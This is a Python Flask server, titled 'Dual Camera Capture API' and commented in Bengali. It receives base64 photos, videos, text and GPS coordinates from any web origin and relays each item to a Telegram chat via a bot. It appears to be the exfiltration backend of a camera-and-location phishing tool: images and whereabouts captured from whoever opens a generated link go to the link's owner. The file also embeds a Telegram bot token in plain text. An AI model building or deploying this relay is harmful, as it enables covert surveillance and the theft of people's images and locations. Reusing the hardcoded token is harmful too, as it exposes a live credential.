import os
import uuid
import json
import logging
from datetime import datetime
from flask import Flask, request, jsonify
from flask_cors import CORS
from telegram import Bot
import asyncio
from dotenv import load_dotenv
import base64
from io import BytesIO

# লোড এনভায়রনমেন্ট ভেরিয়েবল
load_dotenv()

# কনফিগারেশন
BOT_TOKEN = os.getenv('BOT_TOKEN', '8667159815:AAF-tTp5BhziyW69NPpcYGzc4l94BUN9_Mg')
PORT = int(os.getenv('PORT', 5000))

# লগিং সেটআপ
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Flask অ্যাপ তৈরি
app = Flask(__name__)
CORS(app)  # সব ডোমেইন থেকে request আসতে দেবে

# টেলিগ্রাম বট সেটআপ
bot = Bot(token=BOT_TOKEN)

# ইউজার সেশন স্টোর (ইন-মেমরি)
user_sessions = {}

# ================== API এন্ডপয়েন্ট ==================

@app.route('/')
def home():
    """API তথ্য দেখায়"""
    return jsonify({
        'name': 'Dual Camera Capture API',
        'version': '1.0',
        'endpoints': {
            '/health': 'GET - স্বাস্থ্য পরীক্ষা',
            '/api/create-session': 'POST - নতুন ইউজার সেশন তৈরি',
            '/api/capture/<user_id>': 'POST - ক্যাপচার করা ডাটা পাঠান'
        }
    })

@app.route('/health', methods=['GET'])
def health_check():
    """হেল্থ চেক এন্ডপয়েন্ট"""
    return jsonify({
        'status': 'OK',
        'users': len(user_sessions),
        'timestamp': datetime.now().isoformat()
    })

@app.route('/api/create-session', methods=['POST'])
def create_session():
    """নতুন ইউজার সেশন তৈরি - ফ্রন্টএন্ড থেকে কল হবে"""
    data = request.json
    user_id = data.get('user_id')  # টেলিগ্রাম ইউজার আইডি
    username = data.get('username', 'Unknown')
    
    # ইউনিক সেশন আইডি জেনারেট
    session_id = str(uuid.uuid4())
    
    # সেশন সংরক্ষণ
    user_sessions[session_id] = {
        'telegram_user_id': user_id,
        'username': username,
        'created_at': datetime.now().isoformat(),
        'data_received': []
    }
    
    return jsonify({
        'success': True,
        'session_id': session_id,
        'message': 'Session created successfully'
    })

@app.route('/api/capture/<session_id>', methods=['POST'])
def capture_data(session_id):
    """ডাটা রিসিভ করার এন্ডপয়েন্ট"""
    # সেশন ভ্যালিডেশন
    if session_id not in user_sessions:
        return jsonify({'error': 'Invalid session'}), 404
    
    session = user_sessions[session_id]
    data = request.json
    data_type = data.get('type')
    content = data.get('data')
    
    try:
        # টেলিগ্রামে ডাটা পাঠানো
        if data_type == 'text':
            asyncio.run(send_text_message(session['telegram_user_id'], content))
            
        elif data_type == 'photo':
            img_data = base64.b64decode(content['buffer'])
            asyncio.run(send_photo_message(
                session['telegram_user_id'], 
                img_data, 
                content.get('caption', '📸 Captured Photo')
            ))
            
        elif data_type == 'video':
            video_data = base64.b64decode(content['buffer'])
            asyncio.run(send_video_message(
                session['telegram_user_id'], 
                video_data, 
                content.get('caption', '🎥 Captured Video')
            ))
            
        elif data_type == 'location':
            asyncio.run(send_location_message(
                session['telegram_user_id'],
                content['latitude'],
                content['longitude']
            ))
        
        # সেশন আপডেট
        session['data_received'].append({
            'type': data_type,
            'timestamp': datetime.now().isoformat()
        })
        
        return jsonify({'success': True})
        
    except Exception as e:
        logger.error(f"Error sending to Telegram: {e}")
        return jsonify({'error': str(e)}), 500

# ================== টেলিগ্রাম হেল্পার ফাংশন ==================

async def send_text_message(chat_id, text):
    try:
        await bot.send_message(chat_id=chat_id, text=text)
    except Exception as e:
        logger.error(f"Error sending text: {e}")

async def send_photo_message(chat_id, photo_data, caption):
    try:
        photo_file = BytesIO(photo_data)
        photo_file.name = 'photo.jpg'
        await bot.send_photo(chat_id=chat_id, photo=photo_file, caption=caption)
    except Exception as e:
        logger.error(f"Error sending photo: {e}")

async def send_video_message(chat_id, video_data, caption):
    try:
        video_file = BytesIO(video_data)
        video_file.name = 'video.webm'
        await bot.send_video(chat_id=chat_id, video=video_file, caption=caption)
    except Exception as e:
        logger.error(f"Error sending video: {e}")

async def send_location_message(chat_id, latitude, longitude):
    try:
        await bot.send_location(chat_id=chat_id, latitude=latitude, longitude=longitude)
    except Exception as e:
        logger.error(f"Error sending location: {e}")

# ================== মেইন ==================

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=PORT, debug=False)
